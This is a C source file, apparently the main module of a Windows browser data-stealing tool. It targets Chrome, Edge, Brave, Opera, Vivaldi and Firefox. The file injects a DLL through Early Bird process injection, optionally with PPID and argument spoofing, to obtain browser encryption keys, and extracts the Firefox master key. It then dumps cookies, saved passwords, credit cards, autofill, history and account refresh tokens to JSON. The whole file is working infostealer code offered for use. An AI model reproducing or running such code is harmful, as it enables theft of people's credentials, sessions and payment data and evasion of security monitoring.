#include "Headers.h"


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL IsBrowserInstalled(IN BROWSER_TYPE Browser)
{
    WCHAR szBrowserPath[MAX_PATH] = { 0 };
    return GetBrowserPath(Browser, szBrowserPath, MAX_PATH);
}

static BOOL GetDefaultBrowser(OUT BROWSER_TYPE* pBrowser, OUT OPTIONAL LPWSTR szBrowserPath, IN OPTIONAL DWORD dwBrowserPathSize)
{
    WCHAR   szProgId[MAX_PATH]  = { 0 };
    DWORD   dwPathLen           = dwBrowserPathSize,
            dwProgIdLen         = _countof(szProgId);
    HRESULT hResult             = S_OK;

    if (!pBrowser) return FALSE;

    if (szBrowserPath && dwBrowserPathSize)
    {
        if (FAILED((hResult = AssocQueryStringW(ASSOCF_NONE, ASSOCSTR_EXECUTABLE, L"http", L"open", szBrowserPath, &dwPathLen))))
        {
            DBGA("[!] AssocQueryStringW [%d] Failed With Error: 0x%08X", __LINE__, hResult);
            return FALSE;
        }

        if (GetFileAttributesW(szBrowserPath) == INVALID_FILE_ATTRIBUTES)
        {
            DBGA("[!] GetFileAttributesW Failed For '%ws' With Error: %lu", szBrowserPath, GetLastError());
            return FALSE;
        }
    }

    *pBrowser = BROWSER_UNKNOWN;

    if (SUCCEEDED((hResult = AssocQueryStringW(ASSOCF_NONE, ASSOCSTR_PROGID, L"http", L"open", szProgId, &dwProgIdLen))))
    {
        if (StrCmpIW(szProgId, STR_CHROME_PROGID) == 0)
            *pBrowser = BROWSER_CHROME;
        else if (StrCmpIW(szProgId, STR_BRAVE_PROGID) == 0)
            *pBrowser = BROWSER_BRAVE;
        else if (StrCmpIW(szProgId, STR_EDGE_PROGID) == 0)
            *pBrowser = BROWSER_EDGE;
        else if (StrCmpIW(szProgId, STR_OPERA_PROGID) == 0)
            *pBrowser = BROWSER_OPERA;
        else if (StrCmpIW(szProgId, STR_OPERA_GX_PROGID) == 0)
            *pBrowser = BROWSER_OPERA_GX;
        else if (StrCmpIW(szProgId, STR_VIVALDI_PROGID) == 0)
            *pBrowser = BROWSER_VIVALDI;
        else if (StrCmpIW(szProgId, STR_FIREFOX_PROGID) == 0)
            *pBrowser = BROWSER_FIREFOX;
    }
    else
    {
        DBGA("[!] AssocQueryStringW [%d] Failed With Error: 0x%08X", __LINE__, hResult);
        return FALSE;
    }

    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL CacheBrowserDataFiles(IN BROWSER_TYPE Browser)
{
#define BROWSER_DATA_FILE_TYPE_COUNT 6

    CHAR    szRelPaths[BROWSER_DATA_FILE_TYPE_COUNT][MAX_PATH]  = { 0 };
    LPCSTR  ppszRelPaths[BROWSER_DATA_FILE_TYPE_COUNT]          = { 0 };
    DWORD   dwFileCount                                         = 0x00;

#undef BROWSER_DATA_FILE_TYPE_COUNT

    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_COOKIES, szRelPaths[0], MAX_PATH))
        ppszRelPaths[dwFileCount++] = szRelPaths[0];

    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_LOGIN_DATA, szRelPaths[1], MAX_PATH))
        ppszRelPaths[dwFileCount++] = szRelPaths[1];

    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_WEB_DATA, szRelPaths[2], MAX_PATH))
        ppszRelPaths[dwFileCount++] = szRelPaths[2];

    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_HISTORY, szRelPaths[3], MAX_PATH))
        ppszRelPaths[dwFileCount++] = szRelPaths[3];

    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_BOOKMARKS, szRelPaths[4], MAX_PATH))
        ppszRelPaths[dwFileCount++] = szRelPaths[4];

    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_LOCAL_STATE, szRelPaths[5], MAX_PATH))
        ppszRelPaths[dwFileCount++] = szRelPaths[5];

    if (dwFileCount == 0)
        return FALSE;

    DBGV("[v] Caching %lu Browser Data Files...", dwFileCount);

    return (GetBrowserDataFilePathEx(Browser, ppszRelPaths, dwFileCount) > 0);

}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL ExtractFromBrowser(IN BROWSER_TYPE Browser, IN LPCSTR pszOutputFile, IN BOOL bShowAll, IN BOOL bSpoof)
{
    CHROMIUM_DATA   ChromiumData    = { 0 };
    BOOL            bResult         = FALSE;

    DBGV("[i] Target Browser: %s", GetBrowserName(Browser));

    // Initialize the data structure
    if (!InitializeChromiumData(&ChromiumData))
    {
        DBGA("[!] Failed To Initialize Chromium Data");
        goto _END_OF_FUNC;
    }
    
    if (Browser != BROWSER_FIREFOX)
    {
        // Pre-cache All Browser Data Files 
        // Pre-caching only Works For Chromium Browsers. 
        // Because The `GetXXXPathForBrowser` Getters Dont Handle FireFox Paths
        CacheBrowserDataFiles(Browser);

        // Inject DLL to get decryption keys only
        if (!InjectDllViaEarlyBird(bSpoof, Browser, &ChromiumData))
        {
            DBGA("[!] Failed To Retrieve Decryption Keys");
            goto _END_OF_FUNC;
        }

        DBGV("[+] Retrieved Decryption Keys (V10: %s, V20: %s)", ChromiumData.pbDpapiKey ? "Yes" : "No", ChromiumData.pbAppBoundKey ? "Yes" : "No");

        DBGV("[i] Extracting Browser Data...");

        ExtractCookiesFromDatabase(Browser, &ChromiumData);
        ExtractLoginsFromDatabase(Browser, &ChromiumData);
        ExtractCreditCardsFromDatabase(Browser, &ChromiumData);
        ExtractAutofillFromDatabase(Browser, &ChromiumData);
        ExtractHistoryFromDatabase(Browser, &ChromiumData);
        ExtractBookmarksFromFile(Browser, &ChromiumData);
    
        if (Browser == BROWSER_OPERA || Browser == BROWSER_OPERA_GX)
            ExtractOperaAccessTokensFromDatabase(Browser, &ChromiumData);
        else
            ExtractRefreshTokenFromDatabase(Browser, &ChromiumData);
    }
    else
    {
        DBGV("[i] Extracting Browser Data...");

        ExtractFirefoxCookies(&ChromiumData);
        ExtractFirefoxHistory(&ChromiumData);
        ExtractFirefoxBookmarks(&ChromiumData);
        ExtractFirefoxAutofill(&ChromiumData);

        if (!(ChromiumData.pFireFoxBrsrData = (PFIREFOX_BROWSER_DATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FIREFOX_BROWSER_DATA))))
        {
            DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
            goto _END_OF_FUNC;
        }

        if (ExtractMasterKeyFromKey4Db(NULL, &ChromiumData.pFireFoxBrsrData->pbMasterKey, &ChromiumData.pFireFoxBrsrData->dwMasterKeyLen))
        {
            LPSTR pszMasterKeyHex = BytesToHexString(ChromiumData.pFireFoxBrsrData->pbMasterKey, ChromiumData.pFireFoxBrsrData->dwMasterKeyLen);
            
            if (pszMasterKeyHex)
            {
                DBGV("[*] Firefox Master Key: %s", pszMasterKeyHex);
                HEAP_FREE(pszMasterKeyHex);
            }

            ExtractFirefoxLogins(ChromiumData.pFireFoxBrsrData->pbMasterKey, ChromiumData.pFireFoxBrsrData->dwMasterKeyLen, &ChromiumData);
        }

        ExtractFirefoxAccountTokens(ChromiumData.pFireFoxBrsrData);
    }

#define PRINT_COUNT(label, count) \
    bShowAll ? DBGV("[i] " label "%lu", count) : DBGV("[i] " label "%lu/%lu", min(count, MAX_DISPLAY_COUNT), count)

    DBGV("[+] Extraction Complete!");
    if (Browser != BROWSER_FIREFOX)
    {
        PRINT_COUNT("Tokens:         ", ChromiumData.dwTokenCount);
    } 
    else
    {
        if (ChromiumData.pFireFoxBrsrData)
        {
            DBGV("[i] Account Email:  %s", ChromiumData.pFireFoxBrsrData->szEmail ? ChromiumData.pFireFoxBrsrData->szEmail : "N/A");
            DBGV("[i] Session Token:  %s", ChromiumData.pFireFoxBrsrData->szSessionToken ? "Found" : "N/A");
            DBGV("[i] Sync Token:     %s", ChromiumData.pFireFoxBrsrData->szSyncOAuthToken ? "Found" : "N/A");
        }
    }
    if (Browser != BROWSER_FIREFOX)
    {
        PRINT_COUNT("Credit Cards:   ", ChromiumData.dwCreditCardCount);
    }
    PRINT_COUNT("Cookies:        ", ChromiumData.dwCookieCount);
    PRINT_COUNT("Logins:         ", ChromiumData.dwLoginCount);
    PRINT_COUNT("Autofill:       ", ChromiumData.dwAutofillCount);
    PRINT_COUNT("History:        ", ChromiumData.dwHistoryCount);
    PRINT_COUNT("Bookmarks:      ", ChromiumData.dwBookmarkCount);

#undef PRINT_COUNT

    if (!WriteChromiumDataToJson(&ChromiumData, pszOutputFile, bShowAll))
    {
        DBGA("[!] Failed To Write The %s JSON File", pszOutputFile);
        goto _END_OF_FUNC;
    }

    wprintf(L"[+] Extracted Data Is Written To: %S\n", pszOutputFile);
    wprintf(L"\n");

    bResult = TRUE;

_END_OF_FUNC:
    FreeChromiumData(&ChromiumData);
    DeleteDataFilesCache();
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _CMD_ARGUMENTS
{
    BOOL            bShowAll;
    BOOL            bAllBrowsers;
    BOOL            bSpoof;
    BOOL            bTargetDefaultBrowserOnly;
    LPCSTR          pszOutputFile;
    BROWSER_TYPE    BrowserType;

} CMD_ARGUMENTS, *PCMD_ARGUMENTS;


static BROWSER_TYPE ParseBrowserArg(IN LPCSTR pszArg, OUT PBOOL pbAllBrowsers)
{
    // Skip the "/b:" or "-b:" prefix
    LPCSTR pszBrowser = pszArg + 3;

    *pbAllBrowsers = FALSE;

    if (pszBrowser[0] == '\0') return BROWSER_UNKNOWN;

    if (lstrcmpiA(pszBrowser, "all") == 0)
    {
        *pbAllBrowsers = TRUE;
        return BROWSER_CHROME;
    }
    else if (StrStrIA(pszBrowser, STR_CHROME_BRSR_NAME))
        return BROWSER_CHROME;
    else if (StrStrIA(pszBrowser, STR_BRAVE_BRSR_NAME))
        return BROWSER_BRAVE;
    else if (StrStrIA(pszBrowser, STR_EDGE_BRSR_NAME) || StrStrIA(pszBrowser, STR_EDGE_ALT_BRSR_NAME))
        return BROWSER_EDGE;
    else if (StrStrIA(pszBrowser, STR_OPERA_GX_BRSR_NAME) || StrStrIA(pszBrowser, STR_OPERA_ALT_GX_BRSR_NAME))
        return BROWSER_OPERA_GX;
    else if (StrStrIA(pszBrowser, STR_OPERA_BRSR_NAME))
        return BROWSER_OPERA;
    else if (StrStrIA(pszBrowser, STR_VIVALDI_BRSR_NAME))
        return BROWSER_VIVALDI;
    else if (StrStrIA(pszBrowser, STR_FIREFOX_BRSR_NAME))
        return BROWSER_FIREFOX;

    return BROWSER_UNKNOWN;
}

static BOOL ParseArguments(IN INT argc, IN CHAR* argv[], OUT PCMD_ARGUMENTS pCmdArgs)
{
    LPCSTR pszExeName = PathFindFileNameA(argv[0]);

    if (!pCmdArgs)
        return FALSE;

    // Initialize defaults
    pCmdArgs->bShowAll                  = FALSE;
    pCmdArgs->bAllBrowsers              = FALSE;
    pCmdArgs->bSpoof                    = FALSE;
    pCmdArgs->bTargetDefaultBrowserOnly = FALSE;
    pCmdArgs->pszOutputFile             = NULL;
    pCmdArgs->BrowserType               = BROWSER_UNKNOWN;

    for (int i = 1; i < argc; i++)
    {
        if (lstrcmpiA(argv[i], "/?") == 0 || lstrcmpiA(argv[i], "-?") == 0 || lstrcmpiA(argv[i], "/h") == 0 || lstrcmpiA(argv[i], "-h") == 0)
        {
            goto _PRINT_HELP;
        }
        else if (StrStrIA(argv[i], "/b:") == argv[i] || StrStrIA(argv[i], "-b:") == argv[i])
        {
            pCmdArgs->BrowserType = ParseBrowserArg(argv[i], &pCmdArgs->bAllBrowsers);
            
            if (pCmdArgs->BrowserType == BROWSER_UNKNOWN)
            {
                wprintf(L"[!] Unknown Browser: '%S'\n", argv[i] + 3);
                goto _PRINT_HELP;
            }
        }
        else if (lstrcmpiA(argv[i], "/all") == 0 || lstrcmpiA(argv[i], "-all") == 0)
        {
            pCmdArgs->bShowAll = TRUE;
        }
        else if (lstrcmpiA(argv[i], "/spoof") == 0 || lstrcmpiA(argv[i], "-spoof") == 0)
        {
            pCmdArgs->bSpoof = TRUE;
        }
        else if (lstrcmpiA(argv[i], "/o") == 0 || lstrcmpiA(argv[i], "-o") == 0)
        {
            if (i + 1 < argc)
            {
                pCmdArgs->pszOutputFile = argv[++i];
            }
            else
            {
                wprintf(L"[!] Error: '/o' Requires A Filename\n");
                goto _PRINT_HELP;
            }
        }
        else
        {
            wprintf(L"[!] Unknown Argument : '%S'\n", argv[i]);
            goto _PRINT_HELP;
        }
    }


    // If no browser specified, detect default browser
    if (pCmdArgs->BrowserType == BROWSER_UNKNOWN && !pCmdArgs->bAllBrowsers)
    {
        if (!GetDefaultBrowser(&pCmdArgs->BrowserType, NULL, 0) || pCmdArgs->BrowserType == BROWSER_UNKNOWN)
        {
            wprintf(L"[!] Failed To Detect Default Browser\n");
            wprintf(L"[i] Please Specify A Browser With /b:<browser>\n\n");
            goto _PRINT_HELP;
        }

        pCmdArgs->bTargetDefaultBrowserOnly = TRUE;
        wprintf(L"[i] No Browser Specified, Targeting The Default Browser\n");
    }


    // Print a warning message
    if (pCmdArgs->bAllBrowsers && pCmdArgs->pszOutputFile)
        wprintf(L"[!] Warning: '/o' Is Ignored When Using '/b:all'");


    return TRUE;

_PRINT_HELP:
    wprintf(L"Usage: %S [options]\n\n", pszExeName);
    wprintf(L"Options:\n");
    wprintf(L"  /b:<browser> Target Browser: Chrome, Edge, Brave, Opera, Operagx, Vivaldi, Firefox, All\n");
    wprintf(L"               (Default: System Default Browser)\n");
    wprintf(L"  /o <file>    Output JSON File (Default: <Browser>Data.json)\n");
    wprintf(L"  /spoof       Enable Argument and PPID Spoofing When Retrieving ABE Keys From Chromium-Based Browsers\n");
    wprintf(L"  /all         Export All Entries (Default: Max %d per Category)\n", MAX_DISPLAY_COUNT);
    wprintf(L"  /?           Show This Help Message\n\n");
    wprintf(L"Examples:\n");
    wprintf(L"  %S                            Extract %d Entries From The Default Browser\n", pszExeName, MAX_DISPLAY_COUNT);
    wprintf(L"  %S /b:chrome /spoof           Extract %d Entries From Chrome With PPID and Argument Spoofing\n", pszExeName, MAX_DISPLAY_COUNT);
    wprintf(L"  %S /b:firefox /all            Export All Entries From Firefox\n", pszExeName);
    wprintf(L"  %S /b:brave /o Output.json    Extract %d Entries From Brave To Output.json\n", pszExeName, MAX_DISPLAY_COUNT);
    wprintf(L"  %S /b:all /all                Extract All From All Installed Browsers\n\n", pszExeName);
    return FALSE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

int main(int argc, char* argv[])
{
    CMD_ARGUMENTS   CmdArgs         = { 0 };
    DWORD           dwSuccessCount  = 0,
                    dwFailCount     = 0,
                    dwSkipCount     = 0;
    INT             nResult         = -1;

    if (!ParseArguments(argc, argv, &CmdArgs))
        return -1;

    if (!InitializeAllDynamicFunctions())
        return -1;

    if (CmdArgs.bAllBrowsers)
    {
        BROWSER_TYPE Browsers[] = { BROWSER_CHROME, BROWSER_EDGE, BROWSER_BRAVE, BROWSER_OPERA, BROWSER_OPERA_GX, BROWSER_FIREFOX, BROWSER_VIVALDI };

        for (DWORD i = 0; i < _countof(Browsers); i++)
        {
            if (!IsBrowserInstalled(Browsers[i]))
            {
                DBGV("[i] %s: Not Installed, Skipping...\n", GetBrowserName(Browsers[i]));
                dwSkipCount++;
                continue;
            }

            if (ExtractFromBrowser(Browsers[i], GetBrowserOutputFile(Browsers[i]), CmdArgs.bShowAll, CmdArgs.bSpoof))
                dwSuccessCount++;
            else
                dwFailCount++;
        }

        wprintf(L"\n[*] Summary: %lu Succeeded, %lu Failed, %lu Skipped", dwSuccessCount, dwFailCount, dwSkipCount);

        nResult = (dwSuccessCount > 0) ? 0 : -1;
    }
    else
    {
        if (!CmdArgs.pszOutputFile)
            CmdArgs.pszOutputFile = GetBrowserOutputFile(CmdArgs.BrowserType);

        nResult = ExtractFromBrowser(CmdArgs.BrowserType, CmdArgs.pszOutputFile, CmdArgs.bShowAll, CmdArgs.bSpoof) ? 0 : -1;
    }

    wprintf(L"[*] Bye!");

    return nResult;
}
